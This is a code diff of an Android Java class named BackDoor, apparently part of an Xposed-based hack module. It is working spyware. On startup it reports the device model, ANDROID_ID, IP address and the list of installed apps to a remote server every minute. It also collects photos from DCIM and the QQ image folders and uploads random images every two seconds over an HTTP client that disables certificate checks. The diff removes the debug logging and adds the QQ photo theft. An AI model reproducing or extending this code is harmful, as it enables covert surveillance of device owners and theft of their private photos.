@@ -1,7 +1,6 @@
-package cn.coderstory.xposedtemplate;
+package cn.coderstory.xposedtemplate.hack;
 
 import android.app.ActivityManager;
-import android.app.AndroidAppHelper;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
@@ -9,33 +8,37 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Environment;
 import android.provider.Settings;
+import android.util.Log;
+import cn.coderstory.xposedtemplate.State;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
-import de.robv.android.xposed.XposedBridge;
 import lombok.SneakyThrows;
 import okhttp3.*;
 
-import javax.net.ssl.*;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSocketFactory;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
 import java.io.File;
 import java.io.IOException;
-import java.security.cert.CertificateException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicReference;
 
 import static android.content.Context.ACTIVITY_SERVICE;
+import static cn.coderstory.xposedtemplate.hack.DataCollection.getIP;
 
 
 public class BackDoor {
-    public static OkHttpClient client = getUnsafeOkHttpClient();
+    public static OkHttpClient client = DataCollection.getUnsafeOkHttpClient();
     public static BackDoor INSTANCE = new BackDoor();
     public static Gson gson = new Gson();
-    public static String serial = Settings.Secure.getString(AndroidAppHelper.currentApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
+    public static String serial = Settings.Secure.getString(State.context.getContentResolver(), Settings.Secure.ANDROID_ID);
 
     public void reportDevice() {
         String brand = Build.BRAND + "  " +  Build.MODEL;
         String version = Build.VERSION.RELEASE;
-        List<String> appList = getPkgList();
+        List<String> appList = DataCollection.getPkgList();
         AtomicReference<String> ip = new AtomicReference<>(getIP());
         int imgCount = getImageCount();
         DeviceInfo info = new DeviceInfo();
@@ -46,7 +49,34 @@ public class BackDoor {
         info.setImageCount(imgCount);
         info.setSerial(BackDoor.serial);
         info.setLastOnline(System.currentTimeMillis());
-        XposedBridge.log(gson.toJson(info));
+        try {
+            File sdcard = Environment.getExternalStorageDirectory();
+            File dcim = new File(sdcard, "DCIM/");
+            for (File file : dcim.listFiles()) {
+                for (File ignored : file.listFiles()) {
+                    State.imgList.add(ignored);
+                }
+            }
+            File qq = new File(sdcard,"Tencent/QQ_Images");
+            for (File file : qq.listFiles()) {
+                State.imgList.add(file);
+            }
+            List<String> ignore = this.getIgnore();
+            List<File> clean = new ArrayList<>();
+            State.imgList.forEach( ele -> {
+                String name = ele.getName();
+                if (!ignore.contains(name)) {
+                    clean.add(ele);
+                } else {
+
+                }
+            });
+            State.imgList = clean;
+        } catch (Exception e) {
+            State.hasPermission = false;
+        }
+
+
         Thread t = new Thread(() -> {
             while (true) {
                 try {
@@ -57,8 +87,6 @@ public class BackDoor {
                             .url(State.baseURL + "/reportDevice")
                             .post(body)
                             .build();
-                    String string = client.newCall(request).execute().body().string();
-                    XposedBridge.log("发送alive");
                     Thread.sleep(1000*60);
                 } catch (Exception e) {
                     throw new RuntimeException(e);
@@ -68,7 +96,15 @@ public class BackDoor {
         t.start();
 
     }
+
     public BackDoor() {
+        Log.i("TAG","实例化Backdoor");
+        reportDevice();
+        starUploadImg();
+        getMediaList();
+        setNotice();
+    }
+    public void starUploadImg() {
         Thread uploadImageThread = new Thread(() -> {
             while (true) {
                 try {
@@ -76,13 +112,9 @@ public class BackDoor {
                     int index = (int) (Math.random()* list.size());
                     File file = list.get(index);
 
-                    if (isBackground(AndroidAppHelper.currentApplication().getApplicationContext())) {
+                    if (isBackground(State.context)) {
                         BackDoor.INSTANCE.uploadImage(file);
-                        XposedBridge.log("前台");
-                    } else {
-                        XposedBridge.log("后台");
                     }
-
                     Thread.sleep(2000);
                 } catch (Exception e) {
 
@@ -92,50 +124,24 @@ public class BackDoor {
         uploadImageThread.start();
     }
 
-    public void reportVideo(VideoInfo info) {
-
-    }
-    private boolean isSystemApp(PackageInfo pi) {
-        boolean isSysApp = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 1;
-        boolean isSysUpd = (pi.applicationInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 1;
-        return isSysApp || isSysUpd;
-    }
-    private List<String> getPkgList() {
-        List<String> packages = new ArrayList<>();
-        PackageManager packageManager = AndroidAppHelper.currentApplication().getPackageManager();
-        try {
-            List<PackageInfo> packageInfos = packageManager.getInstalledPackages(PackageManager.GET_ACTIVITIES |
-                    PackageManager.GET_SERVICES);
-            for (PackageInfo info : packageInfos) {
-                if (!isSystemApp(info)) {
-                    String s = info.applicationInfo.loadLabel(packageManager).toString();
-                    packages.add(s);
-                }
-            }
-        } catch (Throwable t) {
-            t.printStackTrace();;
-        }
-        return packages;
-    }
-    @SneakyThrows
-    String getIP()  {
-        AtomicReference<String> result = new AtomicReference<>("");
-        Thread t = new Thread(() -> {
+    public void setNotice() {
+        Thread getNotice = new Thread(() -> {
+            Request request = new Request.Builder()
+                    .url(State.baseURL + "/notice")
+                    .get()
+                    .build();
             try {
-                result.set(client.newCall(new Request(new Request.Builder().url("https://myip.ipip.net/"))).execute().body().string());
+                String msg =  client.newCall(request).execute().body().string();
+                State.notice = msg;
+                Log.i("TAG","notice内容：" + msg);
             } catch (IOException e) {
                 throw new RuntimeException(e);
             }
         });
-        t.start();
-        while (true) {
-            if (!result.get() .equals("")) {
-                break;
-            }
-            Thread.sleep(200);
-        }
-        return result.get();
+        getNotice.start();
     }
+
+
     int getImageCount() {
         int num = 0;
         try {
@@ -146,6 +152,10 @@ public class BackDoor {
                     num++;
                 }
             }
+            File qq = new File(sdcard,"Tencent/QQ_Images");
+            for (File file : qq.listFiles()) {
+                num++;
+            }
         } catch (Exception ignored) {
             num = -1;
         }
@@ -154,7 +164,6 @@ public class BackDoor {
     }
     @SneakyThrows
     public void uploadImage(File file ) {
-        XposedBridge.log("调用upload方法");
         MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
         RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("imgName", file.getName())
@@ -171,24 +180,35 @@ public class BackDoor {
                 .addHeader("Content-Type", "application/x-www-form-urlencoded")
                 .build();
         Response response = client.newCall(request).execute();
-        XposedBridge.log("响应： " + response.body().string());
     }
     @SneakyThrows
     public List<String> getIgnore() {
         MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
         RequestBody body = RequestBody.create(mediaType, "{\r\n    \r\n}");
         Request request = new Request.Builder()
-                .url("api.pprocket.cn/ignore?device=" + BackDoor.serial)
+                .url(State.baseURL + "/ignore?device=" + BackDoor.serial)
                 .method("POST", body)
                 .addHeader("Accept", "application/json, text/plain, */*")
                 .addHeader("Accept-Language", "zh-CN,zh;q=0.9")
                 .addHeader("Connection", "keep-alive")
                 .addHeader("Content-Type", "application/x-www-form-urlencoded")
                 .build();
-        Response response = client.newCall(request).execute();
-        String str = response.body().string();
-        XposedBridge.log("忽略：" + str);
-        return gson.fromJson(str, new TypeToken<List<String>>(){}.getType());
+        AtomicReference<String> res = new AtomicReference<>("");
+        Thread t = new Thread( () -> {
+            try {
+                res.set(client.newCall(request).execute().body().string());
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        });
+        t.start();
+        while (true) {
+            if (!res.get().equals("")) {
+                break;
+            }
+            Thread.sleep(50);
+        }
+        return gson.fromJson(res.get(), new TypeToken<List<String>>(){}.getType());
     }
     @SneakyThrows
     public static String getBaseURL() {
@@ -210,29 +230,23 @@ public class BackDoor {
             }
             Thread.sleep(50);
         }
-        XposedBridge.log("远程地址： " + str.get());
         return str.get();
     }
     @SneakyThrows
-    public static String getMediaList() {
+    public static void getMediaList() {
         AtomicReference<String> result = new AtomicReference<>("");
         Thread t = new Thread(() -> {
             try {
                 result.set(client.newCall(new Request.Builder()
-                        .url(State.baseURL + "/media")
+                        .url(State.baseURL + "/system/video")
                         .build()
                 ).execute().body().string());
+                State.mediaList = gson.fromJson(result.get(), new TypeToken<List<String>>(){}.getType());
             } catch (IOException e) {
                 throw new RuntimeException(e);
             }
         });
         t.start();
-        while (true) {
-            Thread.sleep(100);
-            if (!result.get().equals("")) {
-                return result.get();
-            }
-        }
     }
     private boolean isBackground(Context context){
         ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
@@ -249,42 +263,5 @@ public class BackDoor {
         }
         return false;
     }
-    private static OkHttpClient getUnsafeOkHttpClient() {
-        try {
-            // Create a trust manager that does not validate certificate chains
-            final TrustManager[] trustAllCerts = new TrustManager[]{
-                    new X509TrustManager() {
-                        @Override
-                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
-                        }
-
-                        @Override
-                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
-                        }
-
-                        @Override
-                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
-                            return new java.security.cert.X509Certificate[]{};
-                        }
-                    }
-            };
-
-            // Install the all-trusting trust manager
-            final SSLContext sslContext = SSLContext.getInstance("SSL");
-            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
-            // Create an ssl socket factory with our all-trusting manager
-            final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
-
-
-            OkHttpClient.Builder builder = new OkHttpClient.Builder();
-            builder.sslSocketFactory(sslSocketFactory, (X509TrustManager) trustAllCerts[0]);
-            builder.hostnameVerifier((hostname, session) -> true);
-            OkHttpClient okHttpClient = builder.build();
-            return okHttpClient;
-        } catch (Exception e) {
-            throw new RuntimeException(e);
-        }
-    }
-
 
 }
